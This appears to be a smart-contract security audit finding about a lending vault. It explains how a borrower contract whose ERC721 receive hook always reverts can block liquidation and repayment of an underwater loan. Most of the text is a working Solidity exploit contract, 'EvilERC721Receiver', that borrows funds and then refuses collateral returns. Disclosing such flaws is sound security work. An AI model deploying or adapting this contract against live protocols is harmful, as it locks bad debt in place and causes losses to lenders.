# Vulnerability details

## Impact
When a loan goes underwater, it becomes liquidatable and any user can liquidate that loan. When liquidation is finished the collateral NFT is sent to the loan owner, this is done using `safeTransferFrom` in `_cleanupLoan`, which calls `onERC721Received` on the receiver's end. So if the receiver is a contract that implements a malicious `onERC721Received` that'll always revert, the associated can never be liquidatable or repaid, causing a huge loss to the protocol.

## Proof of Concept
Evil ERC721 receiver:
```
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./V3Vault.sol";

error EvilERC721ReceiverError();

contract EvilERC721Receiver is IERC721Receiver {
    address internal owner;
    V3Vault internal vault;

    modifier onlyOwner() {
        require(msg.sender == owner, "EvilERC721Receiver: not owner");
        _;
    }

    constructor(V3Vault _vault) {
        owner = msg.sender;
        vault = _vault;
    }

    function borrow(uint256 tokenId, uint256 amount) external onlyOwner {
        vault.borrow(tokenId, amount);

        ERC20(vault.asset()).transfer(owner, amount);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        revert EvilERC721ReceiverError();

        return this.onERC721Received.selector;
    }
}
